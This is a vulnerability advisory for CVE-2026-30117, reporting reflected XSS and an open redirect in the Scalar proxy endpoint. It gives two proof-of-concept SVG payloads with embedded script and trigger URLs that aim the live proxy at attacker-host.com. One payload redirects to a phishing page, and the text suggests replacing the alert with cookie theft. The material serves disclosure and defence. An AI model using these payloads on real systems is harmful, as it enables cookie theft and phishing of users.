# CVE-2026-30117 — XSS & Open Redirect in scalar/astro Proxy Endpoint

**CVE:** CVE-2026-30117
**Affected package:** `scalar/astro` v0.1.13
**Vendor:** scalar.com
**Severity:** High (XSS) / Medium (Open Redirect)
**Discoverer:** Prasann Nuwal

---

## Vulnerability

The `scalar_url` parameter of the Scalar proxy endpoint accepts an attacker-controlled URL
pointing to an external SVG file. The proxy fetches the SVG server-side and returns it to the
victim's browser without sanitization or script blocking. Because SVG supports embedded
JavaScript, this enables arbitrary script execution in the context of `proxy.scalar.com`.

**Endpoint:** `https://proxy.scalar.com/?scalar_url=<attacker-svg-url>`
**Parameter:** `scalar_url`
**CWE:** CWE-79 (Cross-Site Scripting), CWE-601 (Open Redirect)

---

## 1. Reflected XSS via Malicious SVG

### Payload

Create `poc-xss.svg` with the following content and host it on an attacker-controlled server:

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    alert('XSS-Test-PoC');
  </script>
</svg>
```

### Trigger URL

```
https://proxy.scalar.com/?scalar_url=https://attacker-host.com/poc-xss.svg
```

### What Happens

1. Victim visits the crafted proxy URL
2. `proxy.scalar.com` fetches the SVG from the attacker's server
3. Proxy returns the SVG to the victim's browser with no Content-Security-Policy or script blocking
4. Browser executes the embedded `<script>` in the context of `proxy.scalar.com`
5. Alert box fires — replace `alert()` with `document.cookie` exfil, credential harvesting, etc.

### Impact

JavaScript executes on `proxy.scalar.com`. An attacker can:
- Steal cookies scoped to `.scalar.com` (analytics, team identifier)
- Redirect the victim to a phishing page
- Perform actions in the victim's browser under the `proxy.scalar.com` origin

---

## 2. Open Redirect via SVG

### Payload

Create `poc-redirect.svg`:

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <script>
    window.location.replace("https://attacker.com/phishing");
  </script>
</svg>
```

### Trigger URL

```
https://proxy.scalar.com/?scalar_url=https://attacker-host.com/poc-redirect.svg
```

### What Happens

1. Victim visits the crafted proxy URL (appears to be a legitimate `scalar.com` link)
2. Proxy returns the SVG, browser executes the redirect script
3. Victim is silently forwarded to the attacker's phishing page

### Impact

The URL appears trustworthy (`proxy.scalar.com`) but silently redirects to an attacker-controlled
site. Commonly used in phishing campaigns and credential harvesting.

---

## Why This Works

The Scalar proxy:
- Returns the upstream response verbatim with no Content-Security-Policy header
- Does not strip or sanitize SVG content before serving it to the browser
- Does not restrict the `scalar_url` parameter to safe content types or trusted origins
- Returns `Access-Control-Allow-Origin: *` weakening cross-origin protections

---

## CVSS:3.1 Vectors

**XSS (High):**
`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` — **Score: 6.1**

**Open Redirect (Medium):**
`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N` — **Score: 4.7**

| Metric | Value | Reason |
|---|---|---|
| Attack Vector | Network | Delivered via crafted URL |
| Attack Complexity | Low | Host an SVG, send a link |
| Privileges Required | None | No account needed |
| User Interaction | Required | Victim must visit the URL |
| Scope | Changed | Script executes on proxy.scalar.com origin |
| Confidentiality | Low | Cookies on proxy.scalar.com domain (analytics) |
| Integrity | Low (XSS) / None (redirect) | JS execution vs. forced navigation |
| Availability | None | No DoS component |

---

## Timeline

| Date | Event |
|---|---|
| 2026-03-27 | CVE-2026-30117 assigned by MITRE |
| 2025-10-25 | Vendor notified (support@scalar.com) — no response received |
| 2026-05-18 | Public disclosure (90-day window expired 2026-01-23) |

---

## References

- [CVE-2026-30117](https://www.cve.org/CVERecord?id=CVE-2026-30117)
- [scalar/scalar GitHub](https://github.com/scalar/scalar/)
- [CWE-79: Cross-Site Scripting](https://cwe.mitre.org/data/definitions/79.html)
- [CWE-601: Open Redirect](https://cwe.mitre.org/data/definitions/601.html)
